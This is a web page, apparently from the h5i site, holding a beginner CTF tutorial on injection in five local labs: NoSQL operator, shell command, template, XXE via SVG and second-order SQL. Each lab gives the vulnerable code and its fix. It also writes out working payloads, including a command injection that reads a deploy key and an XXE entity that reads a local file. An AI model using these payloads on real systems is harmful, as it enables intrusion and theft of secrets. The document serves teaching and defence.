@@ -1,0 +1,249 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Injection Beyond SQL | h5i web security tutorial</title><meta name="description" content="The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input.">
+<meta name="author" content="h5i-dev"><meta name="theme-color" content="#D21C1C">
+<meta name="color-scheme" content="dark"><meta name="robots" content="index, follow, max-image-preview:large">
+<link rel="canonical" href="https://h5i.dev/guides/injection-beyond-sql/"><link rel="icon" type="image/png" href="/_static/logo.png">
+<meta property="og:type" content="article"><meta property="og:site_name" content="h5i">
+<meta property="og:title" content="Injection Beyond SQL | h5i web security tutorial"><meta property="og:description" content="The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input.">
+<meta property="og:url" content="https://h5i.dev/guides/injection-beyond-sql/"><meta property="og:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta property="og:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved"><meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Injection Beyond SQL | h5i web security tutorial">
+<meta name="twitter:description" content="The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input."><meta name="twitter:image" content="https://h5i.dev/_static/sandboxed-browser-ui.png">
+<meta name="twitter:image:alt" content="An h5i browser session: the page an AI agent is reading, beside the request log the engine wrote before any bytes moved">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "headline": "Injection Beyond SQL",
+      "description": "The same mistake in five interpreters: NoSQL operators, shell commands, server-side templates, XML entities, and stored input.",
+      "author": {
+        "@type": "Organization",
+        "name": "h5i-dev"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "h5i"
+      },
+      "datePublished": "2026-09-13",
+      "dateModified": "2026-09-15",
+      "image": "https://h5i.dev/_static/sandboxed-browser-ui.png",
+      "inLanguage": "en",
+      "isPartOf": {
+        "@id": "https://h5i.dev/#website"
+      },
+      "mainEntityOfPage": "https://h5i.dev/guides/injection-beyond-sql/"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://h5i.dev/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Guides",
+          "item": "https://h5i.dev/guides/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Injection Beyond SQL",
+          "item": "https://h5i.dev/guides/injection-beyond-sql/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wght@700;800;900&amp;family=Space+Grotesk:wght@300;400;500;700&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/_static/blog.css?v=20ea6351e0"><link rel="stylesheet" href="/_static/highlight.css?v=45984d5155">
+</head>
+<body><nav class="blog-nav">
+  <a class="nav-logo" href="/"><img src="/_static/logo.png" alt="h5i"><span>h5i</span></a>
+  <ul class="nav-links">
+    <li><a href="/features/">Features</a></li><li><a href="/guides/">Guides</a></li>
+    <li><a href="/manual/">Manual</a></li><li><a href="/blog/">Blog</a></li>
+    <li><a href="https://github.com/h5i-dev/h5i" class="nav-cta">GitHub &rarr;</a></li>
+  </ul>
+</nav><main class="article-wrap"><article class="post">
+<header><div class="post-eyebrow">Tutorial 05 / Injection &middot; 2026-09-13</div>
+<h1>Injection Beyond SQL</h1><p class="post-deck">A beginner-friendly CTF tutorial: cross the boundaries between JSON, shells, templates, XML, and stored data.</p>
+<div class="post-meta"><span>6 min read</span><span>NoSQL &middot; Command &middot; SSTI &middot; XXE &middot; Labs 15&ndash;19</span></div></header>
+<p><a href="/guides/sql-injection/">SQL Injection</a> covered SQL injection. SQL is only one interpreter that may receive attacker-controlled input. In this article, Labs 15–19 of <a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec">h5i-tutorial</a> show the same underlying mistake in five different forms.</p>
+<p>We will use <a href="https://github.com/h5i-dev/h5i">h5i</a> to test NoSQL operators, shell commands, template expressions, XML entities, and a payload that becomes dangerous only after it is stored.</p>
+<p>These are intentionally vulnerable local applications. Only test systems you own or have permission to assess.</p>
+<h2 id="the-common-shape-of-injection">The common shape of injection</h2>
+<p>Injection happens when one system treats data as instructions for another system. The important question is not only “Which characters are blocked?” but:</p>
+<blockquote>
+<p>Which interpreter receives this value next?</p>
+</blockquote>
+<p>A JSON value may become a database operator. A search term may enter a shell command. An SVG may be parsed as XML. A string safely stored today may be concatenated into SQL tomorrow.</p>
+<h2 id="lab-15-nosql-operator-injection">Lab 15: NoSQL operator injection</h2>
+<p>Start the lab and capture the homepage:</p>
+<pre><code class="language-bash">$ ./run.sh 15
+$ h5i browser open 'http://127.0.0.1:9150/' \
+  --session lab15 --new --capture
+</code></pre>
+<p>The login endpoint expects JSON. Instead of sending a password string, send an object:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab15 --create \
+  --set method=POST --set path=/api/login \
+  --set header.Content-Type=application/json \
+  --set json.username=admin \
+  --set 'json.password={&quot;$gt&quot;:&quot;&quot;}'
+</code></pre>
+<p>The response contains <code>FLAG{nosql_operator}</code>.</p>
+<p><code>$gt</code> means “greater than” in MongoDB-style query syntax. Every nonempty password hash is greater than the empty string, so the predicate matches the admin record without knowing its password.</p>
+<p>The vulnerable code passes the request’s shape into the query:</p>
+<pre><code class="language-python">query = {
+    &quot;username&quot;: payload[&quot;username&quot;],
+    &quot;password&quot;: payload[&quot;password&quot;],
+}
+user = collection.find_one(query)
+</code></pre>
+<p>Validation must check types as well as field names. <code>password</code> must be a string, and the application should compare a password using its intended password-verification function rather than constructing a client-controlled query.</p>
+<h2 id="lab-16-command-injection-past-a-blocklist">Lab 16: command injection past a blocklist</h2>
+<p>Start the log-search lab:</p>
+<pre><code class="language-bash">$ ./run.sh 16
+$ h5i browser open \
+  'http://127.0.0.1:9160/api/logs/search?q=ERROR' \
+  --session lab16 --new --capture
+</code></pre>
+<p>The server blocks familiar shell metacharacters such as <code>&amp;&amp;</code>, <code>|</code>, backticks, and <code>$(</code>. But the query is placed inside a quoted shell command. Close the quote, add a command separated by <code>;</code>, then reopen it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab16 \
+  --set &quot;query.q=zz'; ls; echo '&quot;
+</code></pre>
+<p>The output reveals <code>deploy.key</code>. Read it:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab16 \
+  --set &quot;query.q=zz'; cat deploy.key; echo '&quot;
+</code></pre>
+<p>The response contains <code>FLAG{command_injection}</code>.</p>
+<p>A blocklist tries to enumerate every dangerous spelling in a language designed to combine commands. It will miss alternatives.</p>
+<p>The fix is to avoid a shell:</p>
+<pre><code class="language-python">subprocess.run(
+    [&quot;grep&quot;, &quot;--fixed-strings&quot;, query, logfile],
+    capture_output=True,
+)
+</code></pre>
+<p>Passing an argument array keeps the search term as one argument rather than shell syntax. Input validation can still limit length and characters, but it should not be the boundary that prevents command execution.</p>
+<h2 id="lab-17-server-side-template-injection">Lab 17: server-side template injection</h2>
+<p>Start the postcard preview:</p>
+<pre><code class="language-bash">$ ./run.sh 17
+$ h5i browser open \
+  'http://127.0.0.1:9170/api/preview?tpl=hi' \
+  --session lab17 --new --capture
+</code></pre>
+<p>First, determine whether the template engine evaluates expressions:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab17 \
+  --set 'query.tpl={{7*7}}'
+</code></pre>
+<p>If the response contains <code>49</code>, the input is being evaluated rather than merely displayed.</p>
+<p>The lab removes obvious built-ins such as <code>open</code>, but exposes a <code>user</code> object. Python objects can lead back to the globals of the function that created them:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab17 \
+  --set 'query.tpl={{user.__init__.__globals__[&quot;VAULT_KEY&quot;]}}'
+</code></pre>
+<p>The result contains <code>FLAG{ssti_template}</code>.</p>
+<p>The mistake is allowing an untrusted user to supply the template itself:</p>
+<pre><code class="language-python">render(user_supplied_template, user=user)
+</code></pre>
+<p>Use a fixed template and pass user input only as data. A restricted environment reduces exposure but is difficult to make safe when rich application objects remain reachable.</p>
+<h2 id="lab-18-xxe-through-an-svg-upload">Lab 18: XXE through an SVG upload</h2>
+<p>SVG is an image format, but it is also XML. An XML parser may support external entities that load local files or URLs.</p>
+<p>Start the avatar lab:</p>
+<pre><code class="language-bash">$ ./run.sh 18
+$ h5i browser open 'http://127.0.0.1:9180/' \
+  --session lab18 --new --capture
+</code></pre>
+<p>The homepage prints the location of <code>service.env</code>. Create an SVG whose title expands an external entity:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE svg [
+  &lt;!ENTITY leak SYSTEM &quot;file:///PATH/TO/service.env&quot;&gt;
+]&gt;
+&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
+  &lt;title&gt;&amp;leak;&lt;/title&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>Save it as <code>/tmp/avatar.svg</code>, replacing the path with the one shown by the lab. Upload the exact bytes:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab18 --create \
+  --set method=POST --set path=/api/avatar \
+  --set-file multipart.file=/tmp/avatar.svg \
+  --set multipart.file.filename=avatar.svg \
+  --set multipart.file.content_type=image/svg+xml
+</code></pre>
+<p>The parsed title contains <code>FLAG{xxe_svg_upload}</code>.</p>
+<p>This is <strong>XML external entity injection</strong>, or <strong>XXE</strong>. Disable DTD and external-entity processing for untrusted XML. For image uploads, decode and re-encode images using a format-specific image library instead of trusting their declared content type.</p>
+<h2 id="lab-19-second-order-sql-injection">Lab 19: second-order SQL injection</h2>
+<p>An input may be safe in the request that stores it and dangerous in a later operation that reuses it.</p>
+<p>Start the lab:</p>
+<pre><code class="language-bash">$ ./run.sh 19
+$ h5i browser open 'http://127.0.0.1:9190/' \
+  --session lab19 --new --capture
+</code></pre>
+<p>Register a username that contains SQL:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
+  --set method=POST --set path=/api/register \
+  --set header.Content-Type=application/json \
+  --set &quot;json.username=zz' OR username='admin&quot; \
+  --set json.password=pw1
+</code></pre>
+<p>Registration uses a parameterized query, so the payload is stored literally. Now ask to change that user’s password:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
+  --set method=POST --set path=/api/password \
+  --set header.Content-Type=application/json \
+  --set &quot;json.username=zz' OR username='admin&quot; \
+  --set json.password=pw1 \
+  --set json.new=owned
+</code></pre>
+<p>The password-change code retrieves the stored username and later concatenates it:</p>
+<pre><code class="language-python">sql = f&quot;UPDATE users SET password=? WHERE username='{stored_username}'&quot;
+</code></pre>
+<p>The stored value becomes SQL syntax and also updates the admin. Log in:</p>
+<pre><code class="language-bash">$ h5i websec replay req_0 --session lab19 --create \
+  --set method=POST --set path=/api/login \
+  --set header.Content-Type=application/json \
+  --set json.username=admin --set json.password=owned
+</code></pre>
+<p>The response contains <code>FLAG{second_order_sqli}</code>.</p>
+<p>Data does not become trusted because it came from the database. Parameterize every query at the point where it executes.</p>
+<h2 id="a-reusable-injection-method">A reusable injection method</h2>
+<p>For each input, trace its next interpreter:</p>
+<ol>
+<li>Change its type as well as its value.</li>
+<li>Use a harmless expression such as <code>{{7*7}}</code> before a dangerous payload.</li>
+<li>Compare paired inputs that should produce opposite results.</li>
+<li>Check uploaded formats for secondary parsers.</li>
+<li>Follow stored values into later reads, updates, logs, and exports.</li>
+<li>Fix the interpreter boundary: parameterized queries, argument arrays, fixed templates, and safe parsers.</li>
+</ol>
+<h2 id="summary">Summary</h2>
+<p>Labs 15–19 crossed five boundaries, but the failure was the same: untrusted data acquired the grammar of another system. The most important testing skill is recognizing that interpreter and asking what data it considers executable.</p>
+<pre><code class="language-bash">$ for s in lab15 lab16 lab17 lab18 lab19; do
+    h5i browser close --session &quot;$s&quot;
+  done
+$ ./run.sh stop
+</code></pre>
+<p>In <a href="/guides/browser-as-a-weapon/">The Browser as a Weapon</a>, the interpreter moves into the victim’s browser: reflected and stored XSS, CSRF, CORS, and OAuth redirects.</p>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/h5i-dev/h5i">h5i</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/15-nosql-operator">Lab 15: NoSQL operator injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/16-command-injection">Lab 16: Command injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/17-ssti-template">Lab 17: Server-side template injection</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/18-xxe-svg-upload">Lab 18: XXE through SVG</a></li>
+<li><a href="https://github.com/h5i-dev/h5i-tutorial/tree/main/websec/labs/19-second-order-sqli">Lab 19: Second-order SQL injection</a></li>
+</ul>
+
+<a class="next-up" href="/guides/browser-as-a-weapon/"><span class="label">Next in the series</span><h3>The Browser as a Weapon</h3><p>Make a victim's browser execute code, send authenticated requests, cross origins, and leak an OAuth authorization code.</p></a>
+<div class="post-cta"><h3>Run the labs yourself</h3><p>42 deliberately vulnerable applications, one binary, no Docker and no accounts.</p>
+<div class="hero-actions"><a class="btn btn-primary" href="https://github.com/h5i-dev/h5i-tutorial">Open h5i-tutorial</a></div></div>
+</article></main><footer class="blog-footer"><div class="blog-footer-inner">
+  <div class="brand">h5i<span class="red"> / high-five</span></div>
+  <nav class="links"><a href="/">Home</a><a href="/guides/">Guides</a><a href="/blog/">Blog</a><a href="/manual/">Manual</a><a href="https://github.com/h5i-dev/h5i">GitHub</a></nav>
+  <div class="legal">Apache 2.0 &middot; Built with Rust</div>
+</div></footer>
+<script src="/_static/blog.js?v=41dbda103a" defer></script><script src="/_static/highlight.js?v=ed81eee4e6" defer></script></body></html>
